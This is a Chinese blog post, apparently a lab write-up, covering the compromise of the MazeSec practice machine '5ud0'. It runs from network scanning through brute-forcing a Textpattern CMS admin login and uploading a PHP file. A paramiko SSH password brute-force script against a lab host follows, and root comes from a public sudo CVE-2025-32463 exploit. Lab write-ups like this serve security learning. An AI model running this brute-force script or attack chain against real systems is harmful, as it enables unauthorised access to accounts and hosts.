@@ -1,0 +1,231 @@
+<!doctype html>
+<html lang="zh-CN">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="theme-color" id="meta-theme-color" content="#faf6e9">
+  
+  <title>mazesec-5ud0 · Yliken</title>
+  <meta name="description" content="红豆藏于南枝深处，红豆藏于南枝深处，相思缠绕心头不息，纵使山河阻隔千里，愿化清风伴君身侧">
+  <script>
+    /* 首帧前即定稿纸色：优先手动选择，否则跟随系统亮暗，避免闪烁 */
+    (function () {
+      var theme = 'day';
+      try {
+        var saved = localStorage.getItem('page-one-paper-theme');
+        if (saved === 'day' || saved === 'night') theme = saved;
+        else if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) theme = 'night';
+      } catch (e) { /* ignore */ }
+      document.documentElement.dataset.theme = theme;
+    })();
+  </script>
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+<body>
+  <header class="site-header">
+    <div class="container site-header__inner">
+      <a class="brand" href="/" aria-label="回到首页">
+        <span class="brand__mark" aria-hidden="true">页</span>
+        <span class="brand__name">Yliken</span>
+      </a>
+      <nav class="site-nav" aria-label="站点导航">
+        
+          <a class="site-nav__link" href="/">首页</a>
+        
+          <a class="site-nav__link" href="/archives/">归档</a>
+        
+          <a class="site-nav__link" href="/moments/">朋友圈</a>
+        
+          <a class="site-nav__link" href="/memories/">回忆</a>
+        
+          <a class="site-nav__link" href="/reading/">阅读</a>
+        
+          <a class="site-nav__link" href="/yearly-reviews/">年度总结</a>
+        
+          <a class="site-nav__link" href="/link/">友链</a>
+        
+          <a class="site-nav__link" href="/about/">关于</a>
+        
+      </nav>
+      
+      
+        <button class="theme-toggle" type="button" aria-label="切换到夜晚模式" title="切换到夜晚">
+          <span class="theme-toggle__icon" aria-hidden="true">☾</span>
+        </button>
+      
+    </div>
+  </header>
+
+  
+
+  <main class="site-main">
+    <div class="container">
+      
+<article class="post">
+  <header class="post__header">
+    
+      <p class="post__meta">
+        
+          <time class="post__date" datetime="2025-07-15">2025年7月15日</time>
+        
+        
+          <span class="post__readtime">6 分钟</span>
+        
+        
+          <span class="post__tags" aria-label="标签">
+            <a class="tag" href="/tags/MazeSec/">#MazeSec</a>
+          </span>
+        
+      </p>
+    
+    <h1 class="post__title">mazesec-5ud0</h1>
+  </header>
+
+  <div class="post-body markdown-body">
+    <blockquote>
+<p>为什么全世界的恋 我都失一遍</p>
+<p>为所有的悲剧 当特约演员</p>
+<p>我伤得断肠 我哭的夸张</p>
+<p>像一套港产片</p>
+</blockquote>
+<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# arp-scan -I eth1 192.168.56.0/24</span><br><span class="line">Interface: eth1, type: EN10MB, MAC: 00:0c:29:34:da:f5, IPv4: 192.168.56.103</span><br><span class="line">WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied</span><br><span class="line">WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.56.1    0a:00:27:00:00:04       (Unknown: locally administered)</span><br><span class="line">192.168.56.100  08:00:27:7a:69:65       (Unknown)</span><br><span class="line">192.168.56.147  08:00:27:1f:4e:4b       (Unknown)</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.908 seconds (134.17 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>
+
+<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali]</span><br><span class="line">└─# nmap -p- 192.168.56.147</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-15 08:40 EDT</span><br><span class="line">Nmap scan report for 192.168.56.147</span><br><span class="line">Host is up (0.00079s latency).</span><br><span class="line">Not shown: 65533 closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 08:00:27:1F:4E:4B (PCS Systemtechnik/Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 20.07 seconds</span><br></pre></td></tr></table></figure>
+
+<p>这里我改了一下host</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152041612.png" alt="image-20250715204155481"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152042433.png" alt="image-20250715204207209"></p>
+<p>网站是由<code>Textpattern CMS</code>搭建的</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152043864.png" alt="image-20250715204307804"></p>
+<p>去看了一下这个CMS已经披露的漏洞， 都是需要有认证才能拿到shell</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152044151.png" alt="image-20250715204447103"></p>
+<p>然后我找了一下这个网站的后台地址</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152045591.png" alt="image-20250715204511552"></p>
+<p>不过用户名怎么输入，登录失败网站只有下面一种报错</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152046519.png" alt="image-20250715204622450"></p>
+<p>其实对于这种只有一种报错信息的 我是挺不愿意尝试去爆破的。 因为我无法得知我所要爆破的用户名是否正确</p>
+<p>我在<code>Arricles</code>页面看到一个用户名</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152047550.png" alt="image-20250715204746501"></p>
+<p>其实当时也想过在忘记密码这个页面来验证username是否有效</p>
+<p>但是不论是什么username他都会显示emai发送成功</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152052219.png" alt="image-20250715205219162"></p>
+<p>当时也怀疑过这个是一个账户名</p>
+<p>然后我就去找了一个<a target="_blank" rel="noopener" href="https://textpattern.co/demo">官方的演示站点</a></p>
+<p>登录上去看了一下</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152051113.png" alt="image-20250715205140976"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152054609.png" alt="image-20250715205429532"></p>
+<p>显然这里显示的不是username</p>
+<p>然后就无奈试了试爆破admin</p>
+<p>嘿，还真爆出来了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152055639.png" alt="382515fee378bb4935f51776baf35291"></p>
+<p>然后我在插件处找了一个上传的地方</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152056003.png" alt="image-20250715205602946"></p>
+<p>上传了一个php文件上去</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152057622.png" alt="image-20250715205718574"></p>
+<p>文件内容</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152057650.png" alt="image-20250715205727605"></p>
+<p>然后你就会发现 网站到处都是phpinfo();</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152057516.png" alt="image-20250715205755424"></p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152058515.png" alt="image-20250715205817417"></p>
+<p>然后我就弹了一个shell</p>
+<h1 id="提取"><a href="#提取" class="headerlink" title="提取"></a>提取</h1><p>找了一下有s权限的文件</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152100747.png" alt="image-20250715210015703"></p>
+<p>看到有两个<code>sudo</code>, 想着其中一个肯定不对劲</p>
+<p>但是不知道怎么利用 </p>
+<p>然后还有一个<code>todd</code>这个普通用户 </p>
+<p>就想着先提权到 <code>todd</code>然后再看下一步</p>
+<p>用hydra去爆破<code>todd</code>密码 会报错</p>
+<p>用python写小脚本 也不能频繁爆破</p>
+<p>貌似是做了防爆破措施</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152103301.png" alt="image-20250715210339118"></p>
+<p>这里放一下python脚本的内容</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> paramiko</span><br><span class="line"></span><br><span class="line">host = <span class="string">&quot;192.168.56.147&quot;</span></span><br><span class="line">port = <span class="number">22</span></span><br><span class="line">username = <span class="string">&quot;todd&quot;</span></span><br><span class="line">password_file = <span class="string">&quot;/usr/share/wordlists/rockyou.txt&quot;</span>  <span class="comment"># 你的密码字典路径</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">try_ssh</span>(<span class="params">password</span>):</span><br><span class="line">    ssh = paramiko.SSHClient()</span><br><span class="line">    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        ssh.connect(hostname=host, port=port, username=username, password=password, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[+] 登录成功！密码是: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        ssh.close()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> paramiko.AuthenticationException:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 密码错误: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[-] 连接错误: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(password_file, <span class="string">&quot;r&quot;</span>, errors=<span class="string">&quot;ignore&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> f:</span><br><span class="line">            pwd = line.strip()</span><br><span class="line">            <span class="keyword">if</span> try_ssh(pwd):</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;[*] 爆破结束。&quot;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+<p>然后实在不行了</p>
+<p>看了一下两个<code>sudo</code>的文件的版文 去试试CVE</p>
+<p>其实我这时候对用<code>CVE</code>进行提权没报很大希望</p>
+<p>然后确实<code>/usr/bin/sudo</code>是存在<a target="_blank" rel="noopener" href="https://github.com/kh4sh3i/CVE-2025-32463">CVE-2025-32463</a>这个不久前爆出的漏洞的</p>
+<p>然后下载了一个exp改了一下exp中<code>sudo</code>的路径</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152106014.png" alt="image-20250715210656948"></p>
+<p>然后成功拿到root了</p>
+<p><img src="https://ylikenimages.oss-cn-beijing.aliyuncs.com/images/202507152107717.png" alt="image-20250715210725597"></p>
+
+  </div>
+
+  
+    <nav class="post-toc" id="post-toc" aria-label="文章目录"></nav>
+  
+
+  
+    <footer class="post__license">
+      <span class="post__license-author">Yliken</span>
+      <span class="post__license-sep" aria-hidden="true">·</span>
+      <a class="post__license-link" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a>
+    </footer>
+  
+</article>
+
+
+  <section class="related" aria-label="相关阅读">
+    <h2 class="related__title">相关阅读</h2>
+    <ul class="related__list">
+      
+        <li class="related__item">
+          <time class="related__date" datetime="2025-08-03">2025·08·03</time>
+          <a class="related__link" href="/2025/08/03/%E9%9D%B6%E6%9C%BA/mazesec/mazesec-Motto/">mazesec-Motto</a>
+        </li>
+      
+    </ul>
+  </section>
+
+
+
+  <nav class="post-nav" aria-label="相邻文章">
+    
+      <a class="post-nav__link post-nav__link--prev" href="/2025/07/16/%E4%BA%91/%E4%BA%91%E5%8E%9F%E7%94%9F/k8s%E6%90%AD%E5%BB%BA/">
+        <span class="post-nav__dir">← 上一篇</span>
+        <span class="post-nav__title">k8s搭建记</span>
+      </a>
+    
+    
+      <a class="post-nav__link post-nav__link--next" href="/2025/07/11/AI/%E5%A5%B9%E4%B8%8D%E5%9C%A8%E4%B8%96%E7%95%8C%E6%9F%90%E5%A4%84%EF%BC%8C%E5%8D%B4%E5%9B%9E%E5%BA%94%E4%BA%86%E6%88%91/">
+        <span class="post-nav__dir">下一篇 →</span>
+        <span class="post-nav__title">她不在世界某处，却回应了我</span>
+      </a>
+    
+  </nav>
+
+
+    </div>
+  </main>
+
+  
+
+  
+  <footer class="site-footer">
+    <div class="container site-footer__inner">
+      
+      <p class="site-footer__copy">
+        © 2026 Yliken
+      </p>
+      
+        <p class="site-footer__motto">在技术里较真，也在生活里留白。</p>
+      
+      
+        <p class="site-footer__powered">Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> · <span class="site-footer__theme">Page One</span></p>
+      
+    </div>
+    
+  </footer>
+  
+<script src="/js/theme.js"></script>
+
+  
+  
+</body>
+</html>
